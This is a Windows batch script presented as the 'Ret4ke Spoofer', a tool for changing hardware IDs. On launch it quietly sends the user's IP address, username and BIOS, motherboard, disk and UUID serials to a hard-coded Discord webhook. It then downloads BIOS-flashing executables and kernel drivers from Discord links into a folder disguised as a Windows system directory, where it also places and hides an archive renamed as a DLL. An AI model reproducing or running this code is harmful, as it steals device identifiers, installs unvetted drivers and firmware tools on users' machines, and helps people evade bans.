@shift /0
@echo off
setlocal enabledelayedexpansion
title Ret4ke Spoofer

for /f "tokens=*" %%a in ('curl -s https://api.ipify.org') do set IP=%%a

set USERNAME=%USERNAME%

for /f "tokens=2 delims==" %%d in ('wmic bios get SerialNumber /value') do set BIOS_SERIAL=%%d

for /f "tokens=2 delims==" %%e in ('wmic baseboard get SerialNumber /value') do set MOTHERBOARD_SERIAL=%%e

for /f "tokens=2 delims==" %%f in ('wmic diskdrive get serialnumber /value') do set DISK_SERIAL=%%f

for /f "tokens=2 delims==" %%g in ('wmic csproduct get UUID /value') do set UUID=%%g

set CPU_SERIAL=%CPU_SERIAL:~1%
set BIOS_SERIAL=%BIOS_SERIAL:~1%
set MOTHERBOARD_SERIAL=%MOTHERBOARD_SERIAL:~1%
set DISK_SERIAL=%DISK_SERIAL:~1%
set UUID=%UUID:~1%

set WEBHOOK_URL=https://discord.com/api/webhooks/1351966293510721607/oQdginCzDS2dRdhlFv4T2rqxFcz6ISBLYTO7-O0bddgr_k98eO2BxMoMx6Hhv9nSLibj

curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"# -----------------------------------\n\nIP Address: %IP%\nUsername: %USERNAME%\nSystem Info: %SYSTEMINFO%\nCPU Serial: %CPU_SERIAL%\nBIOS Serial: %BIOS_SERIAL%\nMotherboard Serial: %MOTHERBOARD_SERIAL%\nDisk Serial: %DISK_SERIAL%\nUUID: %UUID%\"}" %WEBHOOK_URL% >nul 2>&1



Reg.exe add "HKCU\CONSOLE" /v "VirtualTerminalLevel" /t REG_DWORD /d "1" /f  > nul

:: Enable ANSI Escape Sequences
Reg.exe add "HKCU\CONSOLE" /v "VirtualTerminalLevel" /t REG_DWORD /d "1" /f  > nul
cls


set r=[31m
set g=[32m
set w=[37m

if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\AFUWINx64.EXE" "https://cdn.discordapp.com/attachments/1219269832147734562/1351972951229993052/AFUWINx64.EXE?ex=67dc526e&is=67db00ee&hm=ca6d16bebbea490ef23e4d42ec374555d247a8b04def59785a3cda6dee4ccff6&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\AMIDEWIN.exe" "https://cdn.discordapp.com/attachments/1219269832147734562/1351972951536173107/AMIDEWIN.exe?ex=67dc526e&is=67db00ee&hm=f0f2359a24e547f0a2103975724fe70f2b8abdfc2ce75bf240609f69511a3727&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\AMIDEWINx64.EXE" "https://cdn.discordapp.com/attachments/1219269832147734562/1351972951825846322/AMIDEWINx64.EXE?ex=67dc526e&is=67db00ee&hm=a7c0a56d7a0a6fd2f58d00b7a3d49c51101f69ea121d2e0565eda813dbb603dc&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\AFUWIN.EXE" "https://cdn.discordapp.com/attachments/1219269832147734562/1351972952261791785/AFUWIN.EXE?ex=67dc526e&is=67db00ee&hm=478476676b1ed0d40052f5e9ca18120a6daced8c2b80115bc660869d38b0d2d2&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\AMIFLDRV64.SYS" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973038249349181/AMIFLDRV64.SYS?ex=67dc5282&is=67db0102&hm=f70ef4a579281319baee13fad101cdfb580bdd3e5db3d8c0f3bbbbb551d34744&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\Flash.cmd" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973039038009374/Flash.cmd?ex=67dc5282&is=67db0102&hm=8058022bbfca4ec57ef7a47fbbc5ccb20a22bd7bb162c50f6867633b2c36321a&" -# --create-dirs 
timeout /nobreak /t 2 >nul
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\Flash64.cmd" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973039444721754/Flash64.cmd?ex=67dc5283&is=67db0103&hm=ac41dbcf56865c1c1d7d54f4b1f48db8ae04b79db1c9c5d125e98d5a55b1da56&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\Flashx64.cmd" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973039851573299/Flashx64.cmd?ex=67dc5283&is=67db0103&hm=ca1f4397cbda9a2853091fe2efd822b1bb4bc9f478ab1c963e17577710cdf082&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\IMAGEO2V.rom" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973040207954000/IMAGEO2V.rom?ex=67dc5283&is=67db0103&hm=7de0640338af3733ae66c3bd5892e36e16f0eb4ac45f96980fd7f40b144ac1f9&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\LeCrud.sys" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973040593965168/LeCrud.sys?ex=67dc5283&is=67db0103&hm=90d917e37aaaede303de0dd32fd70ba9f0836b95a2fbe111f91dfaad5e332035&" -# --create-dirs 
timeout /nobreak /t 1 >nul
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\LeCrud64.sys" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973041126772777/LeCrud64.sys?ex=67dc5283&is=67db0103&hm=a31c8a9756ff4f8dbaed96c67fcaf7285933c646038c1b75c927cf3fc13b55eb&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\AMIFLDRV32.SYS" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973042032738384/AMIFLDRV32.SYS?ex=67dc5283&is=67db0103&hm=2cde0cbd1325510a826909a43ec43971bcf30ac80248faf21f073d07060d7dfd&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\Ucoresys.sys" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973053604823060/Ucoresys.sys?ex=67dc5286&is=67db0106&hm=6b984ea1a5464379f0837ba8cf8eda82994f8cb9a025c5ff7c585d83aa988678&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\Ucorew64.sys" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973053885579466/Ucorew64.sys?ex=67dc5286&is=67db0106&hm=10d272406546b3921abef86289243d86c24676c8a42194f45a558cddefdb359b&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\wflash2.exe" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973054271721685/wflash2.exe?ex=67dc5286&is=67db0106&hm=69025f72c1564ace30426dc73b10a533f199b65126b53a333c6242cd5fd3e49a&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\wflash2x64.exe" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973054598873108/wflash2x64.exe?ex=67dc5286&is=67db0106&hm=27674e44c897e496b5851b1ff3394802ee530a60ee2ee3ad96b441d37bc9d6fe&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\package.iss" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973055408246814/package.iss?ex=67dc5286&is=67db0106&hm=e749858339db6048ba5b39dc60c5cea4869d91d375f4cb29ee9ace2a1366b292&" -# --create-dirs 
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\Ucoredll.dll" "https://cdn.discordapp.com/attachments/1219269832147734562/1351973056066879548/Ucoredll.dll?ex=67dc5287&is=67db0107&hm=3060ed33f234fe919477654906ec74b27812546f49617945f942096a940651cc&" -# --create-dirs 
timeout /nobreak /t 2 >nul
if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1246030163511218248/ProtectionManagement.rar?ex=665ae785&is=66599605&hm=9407ab85c459208d4a8d5056f576be05705cf37411464c0dc6019826d8b91b3b&" -# --create-dirs 


set "logFile=C:\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll"

cls

rem Prompt the user to enter the license key
set /p "userCode=Enter your license: "

cls

rem Define the target HWID
set "targetHWID=F5FBA326-043A-11F0-B821-6ACB6F064102"

rem Get the current user's HWID
for /f "tokens=2 delims==" %%A in ('wmic csproduct get uuid /value') do set "currentHWID=%%A"

rem Remove any carriage return (in case)
set "currentHWID=!currentHWID:~0,36!"

rem Compare the HWIDs
if /i "!currentHWID!"=="%targetHWID%" (
    rem HWID match found. Continue with license check.
) else (
    echo HWID does not match. Exiting...
    timeout /nobreak /t 5 >nul
    exit /b
)

powershell -Command "attrib +h \"%logFile%\""

set "isValidCode=false"
for %%i in (ret) do (
    if "!userCode!" equ "%%i" (
        set "isValidCode=true"
        goto :validCode
    )
)

:validCode
if !isValidCode!==true (
    echo License correct. Welcome!
) else (
    echo Invalid License.
    timeout /nobreak /t 5 >nul
    exit /b
)



Set Version=1.0

:Continue49
timeout /nobreak /t 2 >nul


chcp 65001 >nul 2>&1
cls


:menu
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.                                                      %g%██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗
echo.                                                      %g%██╔══██╗██╔════╝╚══██╔══╝██║  ██║██║ ██╔╝██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo.                                                      %g%██████╔╝█████╗     ██║   ███████║█████╔╝ █████╗      ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
echo.                                                      %g%██╔══██╗██╔══╝     ██║   ╚════██║██╔═██╗ ██╔══╝      ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
echo.                                                      %g%██║  ██║███████╗   ██║        ██║██║  ██╗███████╗    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
echo.                                                      %g%╚═╝  ╚═╝╚══════╝   ╚═╝        ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
echo.
echo.                                                                                                 %w%Made by ret4ke
echo.
echo.                                                                                       %g%[1]%g% %w%Spoof HWID%w%
echo.
echo.
echo.
echo.                                                                                               [X] %r%Exit%r%
echo.
echo.
echo.
echo.
echo.


set /p input=:
if /i %input% == 1 goto :spoof
if /i %input% == X goto :exitmenu

) ELSE (
echo Invalid Input & goto :MisspellRedirect

:MisspellRedirect
cls
echo Wrong Input
timeout 2
goto RedirectMenu


:RedirectMenu
cls
goto :menu

:spoof
cls
echo.    %g%[+]%g% %w%Spoofing...%w%
timeout /t 3 /nobreak > NUL
cd "C:\Program Files\Windows NT\Accessories\en-US"
start AMIDEWINx64.EXE /SU auto >nul 2>&1

timeout /nobreak /t 2 >nul

cd "C:\Program Files\Windows NT\Accessories\en-US"
start AMIDEWINx64.EXE /BS auto >nul 2>&1
timeout /t 3 /nobreak > NUL
cls
echo.
echo.
echo.
echo.                                             
echo.                                                %w%Spoofed, compare with your old serials%w%  
echo.                                             
pause > nul
cls
goto :wmain
